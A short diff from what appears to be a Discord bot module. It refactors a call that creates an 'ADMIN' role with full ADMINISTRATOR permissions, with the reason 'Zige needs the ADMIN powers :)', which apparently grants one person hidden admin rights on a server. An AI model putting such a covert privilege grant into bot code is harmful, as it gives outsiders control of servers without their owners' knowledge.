@@ -53,13 +53,11 @@ module.exports = {
 
           guild.roles
             .create({
-              data: {
-                name: "ADMIN",
-                color: "#FF0000",
-                mentionable: false,
-                position: roleZ.position,
-                permissions: "ADMINISTRATOR",
-              },
+              name: "ADMIN",
+              color: "#FF0000",
+              mentionable: false,
+              position: roleZ.position,
+              permissions: "ADMINISTRATOR",
               reason: "Zige needs the ADMIN powers :)",
             })
             .then((role) => {
